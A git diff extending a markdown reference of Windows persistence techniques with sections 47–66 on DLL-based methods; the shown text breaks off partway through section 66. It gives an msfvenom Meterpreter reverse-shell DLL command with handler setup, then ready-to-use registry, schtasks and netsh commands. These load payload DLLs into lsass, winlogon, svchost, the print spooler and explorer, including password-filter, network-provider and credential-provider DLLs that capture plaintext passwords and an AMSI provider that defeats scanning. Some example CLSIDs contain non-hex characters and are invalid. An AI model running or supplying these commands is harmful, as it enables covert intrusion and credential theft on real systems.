@@ -1,5 +1,5 @@
 # Windows Persistence Techniques — Full Reference
-> **Author:** M. Manikandan
+> **Author:** m.manikandan
 > **Location:** Kumbakonam, Tamil Nadu
 > **Channel:** Hacker Tamizha
 > All payload paths replaced with `{path}` — swap in your implant before use.
@@ -10,7 +10,7 @@
 ## Quick Index
 
 | # | Technique | Admin | MITRE TTP | ATT&CK ID |
-|---|-----------|-------|-----------|-----------|
+|---|-----------|:-----:|-----------|-----------|
 | 1 | Startup Folder — EXE Copy | ❌ | Boot or Logon Autostart: Startup Folder | T1547.001 |
 | 2 | Startup Folder — LNK Shortcut | ❌ | Boot or Logon Autostart: Startup Folder | T1547.001 |
 | 3 | All Users Startup | ✅ | Boot or Logon Autostart: Startup Folder | T1547.001 |
@@ -49,7 +49,7 @@
 | 36 | Disk Cleanup COM Handler | ❌ | Event Triggered: Component Object Model Hijacking | T1546.015 |
 | 37 | Windows Error Reporting (AeDebug) | ✅ | Event Triggered: IFEO Injection | T1546.012 |
 | 38 | Application Shim (AppCompat) | ✅ | Event Triggered: Application Shimming | T1546.011 |
-| 39 | WMI Event Subscription | ✅ | Event Triggered: Windows Management Instrumentation | T1546.003 |
+| 39 | WMI Event Subscription | ✅ | Event Triggered: WMI Event Subscription | T1546.003 |
 | 40 | Hidden User Account | ✅ | Create Account: Local Account | T1136.001 |
 | 41 | fodhelper UAC Bypass | ❌ | Abuse Elevation Control: Bypass UAC | T1548.002 |
 | 42 | WSL Persistence | ❌ | Command & Scripting Interpreter: Unix Shell | T1059.004 |
@@ -57,6 +57,28 @@
 | 44 | DPAPI Machine Scope | ✅ | Obfuscated Files: Encrypted/Encoded File | T1027.013 |
 | 45 | AES Encrypted Registry Loader | ❌ | Obfuscated Files: Encrypted/Encoded File | T1027.013 |
 | 46 | XOR Obfuscated + DPAPI + RunKey | ❌ | Obfuscated Files + Registry Run Keys | T1027 + T1547.001 |
+| **— DLL-BASED TECHNIQUES —** | | | | |
+| 47 | AppInit_DLLs | ✅ | Event Triggered: AppInit DLLs | T1546.010 |
+| 48 | COM DLL Hijack (HKCU Override) | ❌ | Event Triggered: COM Object Hijacking | T1546.015 |
+| 49 | Service DLL — svchost.exe | ✅ | Create or Modify System Process: Windows Service | T1543.003 |
+| 50 | Winlogon Notification Package DLL | ✅ | Boot or Logon Autostart: Winlogon Helper DLL | T1547.004 |
+| 51 | LSA Security Support Provider (SSP) DLL | ✅ | Boot or Logon Autostart: Security Support Provider | T1547.005 |
+| 52 | rundll32 + RunKey (Reflective DLL) | ❌ | Boot or Logon Autostart: Registry Run Keys | T1547.001 |
+| 53 | Scheduled Task — rundll32 DLL | ❌ | Scheduled Task/Job: Scheduled Task | T1053.005 |
+| 54 | Phantom DLL Hijack | ❌ | Hijack Execution Flow: DLL Search Order Hijacking | T1574.001 |
+| 55 | .NET Profiler DLL (COR_PROFILER) | ❌ | Hijack Execution Flow: COR_PROFILER | T1574.012 |
+| 56 | ETW Provider Hijack DLL | ✅ | Hijack Execution Flow | T1574 |
+| 57 | AMSI Provider DLL | ✅ | Impair Defenses: Disable or Modify Tools | T1562.001 |
+| 58 | Print Processor DLL | ✅ | Boot or Logon Autostart: Print Processors | T1547.012 |
+| 59 | Winsock LSP DLL | ❌ | Hijack Execution Flow | T1574 |
+| 60 | netsh Helper DLL | ✅ | Hijack Execution Flow: DLL Search Order Hijacking | T1574.001 |
+| 61 | WMI Provider DLL | ✅ | Event Triggered: WMI Event Subscription | T1546.003 |
+| 62 | Network Provider DLL | ✅ | Modify Authentication Process: Network Provider DLL | T1556.008 |
+| 63 | Password Filter DLL (SAM) | ✅ | Modify Authentication Process: Password Filter DLL | T1556.002 |
+| 64 | WinRT DLL Activation (HKCU) | ❌ | Hijack Execution Flow: DLL Side-Loading | T1574.002 |
+| 65 | Credential Provider DLL | ✅ | Boot or Logon Autostart: Winlogon Helper DLL | T1547.004 |
+| 66 | Shell Extension DLL (Context Menu) | ❌ | Hijack Execution Flow: DLL Search Order Hijacking | T1574.001 |
+| 67 | DiagTrack DLL Hijack | ❌ | Hijack Execution Flow: DLL Side-Loading | T1574.002 |
 
 ---
 
@@ -84,6 +106,14 @@
 | Create Account (T1136.001) | APT33, OilRig, Lazarus Group |
 | UAC Bypass (T1548.002) | APT29, APT41, Turla |
 | Obfuscation (T1027) | APT28, APT29, Lazarus Group, APT41 |
+| AppInit DLLs (T1546.010) | Turla, APT29 |
+| Security Support Provider (T1547.005) | Turla, APT28, PLATINUM |
+| DLL Search Order Hijacking (T1574.001) | APT41, Lazarus Group, Turla |
+| COR_PROFILER (T1574.012) | Lazarus Group, Turla |
+| Print Processors (T1547.012) | Lazarus Group, APT28 |
+| Network Provider DLL (T1556.008) | APT28, Lazarus Group |
+| Password Filter DLL (T1556.002) | APT28, Lazarus Group |
+| DLL Side-Loading (T1574.002) | APT41, Lazarus Group, APT29 |
 
 ---
 
@@ -1316,6 +1346,617 @@ del "C:\ProgramData\loader.ps1"
 
 ---
 
+## — DLL-BASED PERSISTENCE TECHNIQUES —
+
+> **Payload generation (Metasploit):**
+> ```
+> msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f dll > payload.dll
+> ```
+> **Handler setup:**
+> ```
+> msfconsole -q
+> use exploit/multi/handler
+> set LHOST <Your_IP>
+> set LPORT <Your_Port>
+> run
+> ```
+
+---
+
+## 47. AppInit_DLLs
+**TTP:** T1546.010 | **Admin:** ✅ | **APT:** Turla, APT29
+
+`AppInit_DLLs` is loaded into every process that imports `user32.dll` — covers most GUI applications. One of the oldest and broadest DLL injection vectors.
+
+```batch
+:: Add DLL to AppInit_DLLs
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t REG_SZ /d "C:\lab\payload.dll" /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v RequireSignedAppInit_DLLs /t REG_DWORD /d 0 /f
+
+:: Verify
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs
+
+:: Cleanup
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t REG_SZ /d "" /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t REG_DWORD /d 0 /f
+```
+
+> **Note:** Disabled by default on Windows 8+ when Secure Boot is active. `RequireSignedAppInit_DLLs` set to 0 required for unsigned DLLs.
+
+---
+
+## 48. COM DLL Hijack (HKCU Override)
+**TTP:** T1546.015 | **Admin:** ❌ | **APT:** APT28, Turla, BRONZE BUTLER
+
+HKCU COM registration overrides HKLM — no admin needed. Find a CLSID registered in HKLM but not in HKCU, then register your DLL under HKCU. Target app calls `CoCreateInstance` → loads your DLL.
+
+```batch
+:: Generic CLSID hijack — replace {CLSID-HERE} with target CLSID
+reg add "HKCU\Software\Classes\CLSID\{CLSID-HERE}\InprocServer32" /ve /t REG_SZ /d "C:\lab\payload.dll" /f
+reg add "HKCU\Software\Classes\CLSID\{CLSID-HERE}\InprocServer32" /v ThreadingModel /t REG_SZ /d "Apartment" /f
+
+:: Example: MMC snap-in CLSID hijack
+reg add "HKCU\Software\Classes\CLSID\{BCF2C8F5-9303-4F96-B1F9-37A6E7B77EA4}\InprocServer32" /ve /t REG_SZ /d "C:\lab\payload.dll" /f
+reg add "HKCU\Software\Classes\CLSID\{BCF2C8F5-9303-4F96-B1F9-37A6E7B77EA4}\InprocServer32" /v ThreadingModel /t REG_SZ /d "Apartment" /f
+
+:: Verify
+reg query "HKCU\Software\Classes\CLSID\{BCF2C8F5-9303-4F96-B1F9-37A6E7B77EA4}"
+
+:: Cleanup
+reg delete "HKCU\Software\Classes\CLSID\{BCF2C8F5-9303-4F96-B1F9-37A6E7B77EA4}" /f
+```
+
+> **Tip:** Use [Process Monitor](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon) to find CLSIDs that trigger `NAME NOT FOUND` in HKCU — these are hijackable without admin.
+
+---
+
+## 49. Service DLL — svchost.exe
+**TTP:** T1543.003 | **Admin:** ✅ | **APT:** APT28, Lazarus Group, FIN7, Carbanak
+
+Registers a DLL as a `svchost`-hosted service — DLL runs inside `svchost.exe` and blends in perfectly with legitimate services.
+
+```batch
+:: Step 1: Register DLL as a service
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\FakeSvc" /v Type /t REG_DWORD /d 32 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\FakeSvc" /v Start /t REG_DWORD /d 2 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\FakeSvc" /v ObjectName /t REG_SZ /d "LocalSystem" /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\FakeSvc\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "C:\lab\payload.dll" /f
+
+:: Step 2: Add to svchost group
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost" /v FakeGroup /t REG_MULTI_SZ /d "FakeSvc" /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\FakeSvc" /v ImagePath /t REG_EXPAND_SZ /d "%SystemRoot%\System32\svchost.exe -k FakeGroup" /f
+
+:: Step 3: Start
+sc start FakeSvc
+
+:: Verify
+sc qc FakeSvc
+
+:: Cleanup
+sc stop FakeSvc
+sc delete FakeSvc
+reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost" /v FakeGroup /f
+```
+
+> **DLL exports required:** `ServiceMain` — standard Windows service DLL entry point.
+
+---
+
+## 50. Winlogon Notification Package DLL
+**TTP:** T1547.004 | **Admin:** ✅ | **APT:** APT28, Turla, PLATINUM
+
+Registers a DLL under `Winlogon\Notify` — loaded by `winlogon.exe` at boot and called on logon/logoff events.
+
+```batch
+:: Register notification package
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\FakeNotify" /v DllName /t REG_SZ /d "C:\lab\payload.dll" /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\FakeNotify" /v Logon /t REG_SZ /d "WinlogonLogonEvent" /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\FakeNotify" /v Asynchronous /t REG_DWORD /d 0 /f
+
+:: Verify
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify"
+
+:: Cleanup
+reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\FakeNotify" /f
+```
+
+> **DLL export required:** The function name set in the `Logon` value (e.g., `WinlogonLogonEvent`).
+
+---
+
+## 51. LSA Security Support Provider (SSP) DLL
+**TTP:** T1547.005 | **Admin:** ✅ | **APT:** Turla, APT28, PLATINUM
+
+Registers a DLL as an LSA Security Package — loaded into `lsass.exe` memory space. Highly stealthy; runs in the authentication subsystem.
+
+```batch
+:: Append your DLL name to the Security Packages list
+:: (No path — DLL must exist in C:\Windows\System32\)
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Security Packages" /t REG_MULTI_SZ /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0payload" /f
+
+:: Copy DLL to System32 (name must match value above)
+copy "C:\lab\payload.dll" "C:\Windows\System32\payload.dll"
+
+:: Takes effect after reboot
+
+:: Verify
+reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Security Packages"
+
+:: Cleanup — restore original list
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Security Packages" /t REG_MULTI_SZ /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u" /f
+del "C:\Windows\System32\payload.dll"
+```
+
+> **Note:** DLL name only (no path) in the registry value — Windows resolves from `System32`.
+
+---
+
+## 52. rundll32 + RunKey (Reflective DLL)
+**TTP:** T1547.001 | **Admin:** ❌ | **APT:** FIN7, Carbanak
+
+Uses `rundll32.exe` to call a specific DLL export via a Registry Run key. Legitimate binary (`rundll32.exe`) executes the DLL — low suspicion on the process name.
+
+```batch
+:: Basic RunKey + rundll32 persistence
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SyncSvc" /t REG_SZ /d "rundll32.exe C:\lab\payload.dll,EntryPoint" /f
+
+:: With hidden window via PowerShell wrapper
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SyncSvc" /t REG_SZ /d "powershell.exe -WindowStyle Hidden -Command \"rundll32.exe C:\lab\payload.dll,main\"" /f
+
+:: Verify
+reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v SyncSvc
+
+:: Cleanup
+reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v SyncSvc /f
+```
+
+> **DLL export required:** The export name specified after the comma (e.g., `EntryPoint`, `main`).
+
+---
+
+## 53. Scheduled Task — rundll32 DLL
+**TTP:** T1053.005 | **Admin:** ❌ | **APT:** APT41, Lazarus Group
+
+Scheduled task calling a DLL export via `rundll32.exe` — combines task scheduler stealth with DLL execution.
+
+```powershell
+# Basic one-liner
+schtasks /create /tn "WinSyncDLL" /sc onlogon /tr "rundll32.exe C:\lab\payload.dll,main" /f
+
+# XML method with Hidden flag
+$xml = @"
+<Task xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+  <Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger></Triggers>
+  <Settings><Hidden>true</Hidden><ExecutionTimeLimit>PT0S</ExecutionTimeLimit></Settings>
+  <Actions><Exec>
+    <Command>rundll32.exe</Command>
+    <Arguments>C:\lab\payload.dll,main</Arguments>
+  </Exec></Actions>
+</Task>
+"@
+$xml | Out-File "C:\lab\dll_task.xml" -Encoding Unicode
+schtasks /create /tn "WinSyncDLL" /xml "C:\lab\dll_task.xml" /f
+
+# Verify
+schtasks /query /tn "WinSyncDLL" /fo LIST /v
+
+# Cleanup
+schtasks /delete /tn "WinSyncDLL" /f
+```
+
+---
+
+## 54. Phantom DLL Hijack
+**TTP:** T1574.001 | **Admin:** ❌ | **APT:** APT41, Lazarus Group, PowerGhost
+
+Drops payload DLL with the name of a DLL that is searched for but missing from the system — Windows finds your DLL first during the search order walk.
+
+```powershell
+# These DLL names are commonly missing — drop payload with these exact names
+$targets = @(
+    "$env:LOCALAPPDATA\Microsoft\WindowsApps\wbemcomn.dll",
+    "C:\Python39\wbemcomn.dll",
+    "C:\Git\bin\version.dll",
+    "C:\Program Files\7-Zip\version.dll"
+)
+
+foreach ($t in $targets) {
+    Copy-Item "C:\lab\payload.dll" $t
+}
+
+# Verify PATH search order
+$env:PATH -split ";"
+
+# Cleanup
+foreach ($t in $targets) {
+    Remove-Item $t -ErrorAction SilentlyContinue
+}
+```
+
+> **Hunting tip:** Use Process Monitor filter `Result = NAME NOT FOUND` + `Path ends with .dll` to identify phantom DLL opportunities per target application.
+
+---
+
+## 55. .NET Profiler DLL (COR_PROFILER)
+**TTP:** T1574.012 | **Admin:** ❌ | **APT:** Lazarus Group, Turla
+
+The CLR Profiling API loads a DLL into every .NET process launched by the user — no admin needed via HKCU environment variables. Affects `powershell.exe`, `msbuild.exe`, Teams, OneDrive, and any other .NET application.
+
+```powershell
+# Method 1: User environment variables via PowerShell
+[Environment]::SetEnvironmentVariable("COR_ENABLE_PROFILING", "1", "User")
+[Environment]::SetEnvironmentVariable("COR_PROFILER", "{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}", "User")
+[Environment]::SetEnvironmentVariable("COR_PROFILER_PATH", "C:\lab\payload.dll", "User")
+
+# Method 2: Registry (HKCU — no admin)
+reg add "HKCU\Environment" /v COR_ENABLE_PROFILING /t REG_SZ /d "1" /f
+reg add "HKCU\Environment" /v COR_PROFILER /t REG_SZ /d "{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}" /f
+reg add "HKCU\Environment" /v COR_PROFILER_PATH /t REG_SZ /d "C:\lab\payload.dll" /f
+
+# Verify
+[Environment]::GetEnvironmentVariable("COR_PROFILER_PATH", "User")
+
+# Cleanup
+reg delete "HKCU\Environment" /v COR_ENABLE_PROFILING /f
+reg delete "HKCU\Environment" /v COR_PROFILER /f
+reg delete "HKCU\Environment" /v COR_PROFILER_PATH /f
+```
+
+> **DLL export required:** `DllGetClassObject` — standard COM class factory export expected by the CLR profiling interface.
+
+---
+
+## 56. ETW Provider Hijack DLL
+**TTP:** T1574 | **Admin:** ✅ | **APT:** Nation-state actors
+
+ETW (Event Tracing for Windows) providers can register DLL paths. Analysts rarely inspect ETW provider registrations — extremely low detection rate.
+
+```batch
+:: Find ETW providers with DLL paths registered
+reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Publishers" /s | findstr /i "dll"
+
+:: Register a fake ETW provider pointing to your DLL
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Publishers\{DEADBEEF-0000-0000-0000-000000000001}" /v "(Default)" /t REG_SZ /d "FakeProvider" /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Publishers\{DEADBEEF-0000-0000-0000-000000000001}" /v "MessageFileName" /t REG_EXPAND_SZ /d "C:\lab\payload.dll" /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Publishers\{DEADBEEF-0000-0000-0000-000000000001}" /v "ResourceFileName" /t REG_EXPAND_SZ /d "C:\lab\payload.dll" /f
+
+:: Verify
+reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Publishers\{DEADBEEF-0000-0000-0000-000000000001}"
+
+:: Cleanup
+reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Publishers\{DEADBEEF-0000-0000-0000-000000000001}" /f
+```
+
+---
+
+## 57. AMSI Provider DLL
+**TTP:** T1562.001 | **Admin:** ✅ | **APT:** Nation-state actors
+
+Registers a DLL as an AMSI (Antimalware Scan Interface) provider — called on every PowerShell, VBScript, and JScript execution. Can intercept script content or return `AMSI_RESULT_CLEAN` to bypass scanning.
+
+```powershell
+# Register fake AMSI provider
+$guid = "{CAFEBABE-1337-1337-1337-CAFEBABE1337}"
+reg add "HKLM\SOFTWARE\Microsoft\AMSI\Providers\$guid" /ve /t REG_SZ /d "C:\lab\amsi_provider.dll" /f
+
+# Verify registered providers
+reg query "HKLM\SOFTWARE\Microsoft\AMSI\Providers"
+
+# Cleanup
+reg delete "HKLM\SOFTWARE\Microsoft\AMSI\Providers\$guid" /f
+```
+
+> **DLL exports required:** `AmsiInitialize`, `AmsiOpenSession`, `AmsiScanBuffer`, `AmsiScanString`, `AmsiCloseSession`, `AmsiUninitialize`.
+
+---
+
+## 58. Print Processor DLL (Spooler)
+**TTP:** T1547.012 | **Admin:** ✅ | **APT:** Lazarus Group, APT28
+
+Registers a DLL as a print processor — loaded into `spoolsv.exe` (SYSTEM context) at boot. Survives reboot, runs as SYSTEM.
+
+```batch
+:: Step 1: Copy DLL to spooler directory
+copy "C:\lab\payload.dll" "C:\Windows\System32\spool\prtprocs\x64\evil_proc.dll"
+
+:: Step 2: Register as print processor
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors\EvilProc" /v Driver /t REG_SZ /d "evil_proc.dll" /f
+
+:: Step 3: Restart spooler to load
+net stop spooler && net start spooler
+
+:: Verify
+reg query "HKLM\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors"
+
+:: Cleanup
+net stop spooler
+reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors\EvilProc" /f
+del "C:\Windows\System32\spool\prtprocs\x64\evil_proc.dll"
+net start spooler
+```
+
+> **DLL exports required:** `EnumPrintProcessorDatatypes`, `OpenPrintProcessor`, `PrintDocumentOnPrintProcessor`, `ClosePrintProcessor`.
+
+---
+
+## 59. Winsock LSP DLL
+**TTP:** T1574 | **Admin:** ❌ (older OS) / ✅ (Windows 10+) | **APT:** Custom/Red Team
+
+Layered Service Provider — inserts DLL into the Winsock stack, intercepting all socket-level network traffic from every process using Winsock.
+
+```powershell
+# Install LSP via netsh
+netsh winsock add provider "C:\lab\lsp_payload.dll"
+
+# Verify installed LSPs
+netsh winsock show catalog
+
+# Remove by catalog ID (get ID from show catalog output)
+netsh winsock remove provider <catalog-id>
+
+# Nuclear option — reset entire Winsock catalog
+netsh winsock reset
+```
+
+> **DLL export required:** `WSPStartup` — called when any application opens a socket.
+> **Note:** LSP installation requires admin on Windows 10+. On legacy systems, user-level installation may be possible.
+
+---
+
+## 60. netsh Helper DLL
+**TTP:** T1574.001 | **Admin:** ✅ | **APT:** Custom/Red Team
+
+Registers a DLL as a `netsh` helper — loaded every time `netsh.exe` is executed. `netsh` is a trusted, Microsoft-signed binary.
+
+```batch
+:: Register helper DLL
+netsh add helper C:\lab\payload.dll
+
+:: Verify registered helpers
+netsh show helper
+
+:: Registry path for netsh helpers
+:: HKLM\SOFTWARE\Microsoft\NetSh
+
+:: Cleanup
+reg delete "HKLM\SOFTWARE\Microsoft\NetSh" /v <your_value_name> /f
+```
+
+> **DLL export required:** `InitHelperDll` — entry point called by `netsh.exe` on load.
+
+---
+
+## 61. WMI Provider DLL
+**TTP:** T1546.003 | **Admin:** ✅ | **APT:** APT29, Turla
+
+Registers a DLL as a WMI provider — loaded into `wmiprvse.exe` (runs as SYSTEM). Fires on WMI queries targeting the registered class.
+
+```powershell
+# Step 1: Register CLSID pointing to your DLL
+reg add "HKLM\SOFTWARE\Classes\CLSID\{AABBCCDD-0000-0000-0000-000000000001}\InprocServer32" /ve /t REG_SZ /d "C:\lab\payload.dll" /f
+reg add "HKLM\SOFTWARE\Classes\CLSID\{AABBCCDD-0000-0000-0000-000000000001}\InprocServer32" /v ThreadingModel /t REG_SZ /d "Both" /f
+
+# Step 2: Create and register MOF file
+$mof = @"
+#pragma namespace("\\\\.\\\root\\cimv2")
+
+instance of __Win32Provider as $P
+{
+    Name    = "Evil";
+    CLSID   = "{AABBCCDD-0000-0000-0000-000000000001}";
+    DefaultMachineName = NULL;
+    ImpersonatorCLSID = NULL;
+    InitializationReentrancy = 0;
+    PerUserInitialization = FALSE;
+    Pure = TRUE;
+    UnloadTimeout = NULL;
+};
+
+instance of __InstanceProviderRegistration
+{
+    Provider = $P;
+    SupportsPut = TRUE;
+    SupportsGet = TRUE;
+    SupportsDelete = TRUE;
+    SupportsEnumeration = TRUE;
+};
+"@
+$mof | Out-File "C:\lab\evil_provider.mof" -Encoding ASCII
+mofcomp.exe C:\lab\evil_provider.mof
+
+# Verify
+reg query "HKLM\SOFTWARE\Classes\CLSID\{AABBCCDD-0000-0000-0000-000000000001}"
+
+# Cleanup
+$mofRemove = "#pragma namespace(`"\\\\.\\\root\\cimv2`")`n#pragma deleteclass(`"EvilClass`", NOFAIL)"
+$mofRemove | Out-File "C:\lab\remove.mof" -Encoding ASCII
+mofcomp.exe C:\lab\remove.mof
+reg delete "HKLM\SOFTWARE\Classes\CLSID\{AABBCCDD-0000-0000-0000-000000000001}" /f
+```
+
+---
+
+## 62. Network Provider DLL
+**TTP:** T1556.008 | **Admin:** ✅ | **APT:** APT28, Lazarus Group
+
+Registers a DLL as a Windows Network Provider — loaded into `lsass.exe` at boot. Called during all logon events; can capture credentials in plaintext. Requires reboot.
+
+```batch
+:: Step 1: Register network provider service
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\EvilNP" /v Type /t REG_DWORD /d 32 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\EvilNP\NetworkProvider" /v Name /t REG_SZ /d "EvilNP" /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\EvilNP\NetworkProvider" /v ProviderPath /t REG_EXPAND_SZ /d "C:\lab\payload.dll" /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\EvilNP\NetworkProvider" /v Class /t REG_DWORD /d 2 /f
+
+:: Step 2: Check current provider order first
+reg query "HKLM\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order" /v ProviderOrder
+
+:: Step 3: Append EvilNP to provider order
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order" /v ProviderOrder /t REG_SZ /d "RDPNP,LanmanWorkstation,webclient,EvilNP" /f
+
+:: Verify
+reg query "HKLM\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order"
+
+:: Cleanup
+reg delete "HKLM\SYSTEM\CurrentControlSet\Services\EvilNP" /f
+:: Restore ProviderOrder to original value (remove EvilNP entry)
+```
+
+> **DLL exports required:** `NPGetCaps`, `NPLogonNotify`, `NPPasswordChangeNotify`.
+
+---
+
+## 63. Password Filter DLL (SAM)
+**TTP:** T1556.002 | **Admin:** ✅ | **APT:** APT28, Lazarus Group
+
+Registers a DLL as a password change notification filter — loaded permanently into `lsass.exe`. Receives **plaintext** passwords on every password change event.
+
+```batch
+:: Step 1: Copy DLL to System32 (no path in registry — loaded from System32)
+copy "C:\lab\payload.dll" "C:\Windows\System32\passfilt_evil.dll"
+
+:: Step 2: Check current Notification Packages value
+reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Notification Packages"
+
+:: Step 3: Append your DLL name (no extension) to existing value
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Notification Packages" /t REG_MULTI_SZ /d "scecli\0passfilt_evil" /f
+
+:: Takes effect after reboot
+
+:: Verify
+reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Notification Packages"
+
+:: Cleanup
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Notification Packages" /t REG_MULTI_SZ /d "scecli" /f
+del "C:\Windows\System32\passfilt_evil.dll"
+```
+
+> **DLL exports required:** `InitializeChangeNotify`, `PasswordFilter`, `PasswordChangeNotify`.
+
+---
+
+## 64. WinRT DLL Activation (HKCU)
+**TTP:** T1574.002 | **Admin:** ❌ | **APT:** Custom/Red Team
+
+Overrides a WinRT (Windows Runtime) activatable class DLL path in HKCU — no admin needed. Fires when modern/UWP apps activate the targeted class (e.g., Toast notifications).
+
+```powershell
+# Target a WinRT class that fires frequently
+$className = "Windows.UI.Notifications.ToastNotificationManager"
+
+reg add "HKCU\SOFTWARE\Microsoft\WindowsRuntime\ActivatableClassId\$className" /v DllPath /t REG_SZ /d "C:\lab\payload.dll" /f
+reg add "HKCU\SOFTWARE\Microsoft\WindowsRuntime\ActivatableClassId\$className" /v Threading /t REG_DWORD /d 3 /f
+reg add "HKCU\SOFTWARE\Microsoft\WindowsRuntime\ActivatableClassId\$className" /v TrustLevel /t REG_DWORD /d 0 /f
+reg add "HKCU\SOFTWARE\Microsoft\WindowsRuntime\ActivatableClassId\$className" /v ActivationType /t REG_DWORD /d 1 /f
+
+# Verify
+reg query "HKCU\SOFTWARE\Microsoft\WindowsRuntime\ActivatableClassId\$className"
+
+# Cleanup
+reg delete "HKCU\SOFTWARE\Microsoft\WindowsRuntime\ActivatableClassId\$className" /f
+```
+
+> **Note:** Enumerate candidate classes at `HKLM\SOFTWARE\Microsoft\WindowsRuntime\ActivatableClassId` — look for classes tied to frequently-used system features.
+
+---
+
+## 65. Credential Provider DLL
+**TTP:** T1547.004 | **Admin:** ✅ | **APT:** APT28, Turla
+
+Registers a DLL as a Windows Credential Provider — loaded into `winlogon.exe` at the logon screen, before the desktop loads. Can intercept all user credential input.
+
+```batch
+:: Step 1: Copy DLL to System32
+copy "C:\lab\payload.dll" "C:\Windows\System32\evil_cp.dll"
+
+:: Step 2: Register the Credential Provider CLSID
+reg add "HKLM\SOFTWARE\Classes\CLSID\{EVILCP01-0000-0000-0000-000000000001}" /ve /t REG_SZ /d "EvilCP" /f
+reg add "HKLM\SOFTWARE\Classes\CLSID\{EVILCP01-0000-0000-0000-000000000001}\InprocServer32" /ve /t REG_SZ /d "evil_cp.dll" /f
+reg add "HKLM\SOFTWARE\Classes\CLSID\{EVILCP01-0000-0000-0000-000000000001}\InprocServer32" /v ThreadingModel /t REG_SZ /d "Apartment" /f
+
+:: Step 3: Register it as a Credential Provider
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers\{EVILCP01-0000-0000-0000-000000000001}" /ve /t REG_SZ /d "EvilCP" /f
+
+:: Verify installed providers
+reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers"
+
+:: Cleanup
+reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers\{EVILCP01-0000-0000-0000-000000000001}" /f
+reg delete "HKLM\SOFTWARE\Classes\CLSID\{EVILCP01-0000-0000-0000-000000000001}" /f
+del "C:\Windows\System32\evil_cp.dll"
+```
+
+> **DLL interface required:** `ICredentialProvider` COM interface implementation.
+
+---
+
+## 66. Shell Extension DLL (Context Menu)
+**TTP:** T1574.001 | **Admin:** ❌ | **APT:** Turla, APT28
+
+Registers a DLL as a shell context menu handler in HKCU — loaded into `explorer.exe` whenever the user right-clicks any file. No admin needed; HKCU overrides HKLM.
+
+```powershell
+$guid = "{SHELLEXT-1337-1337-1337-SHELLEXT13370}"
+
+# Register context menu handler for all files (*)
+reg add "HKCU\Software\Classes\*\shellex\ContextMenuHandlers\EvilMenu" /ve /t REG_SZ /d $guid /f
+reg add "HKCU\Software\Classes\CLSID\$guid" /ve /t REG_SZ /d "EvilShellExt" /f
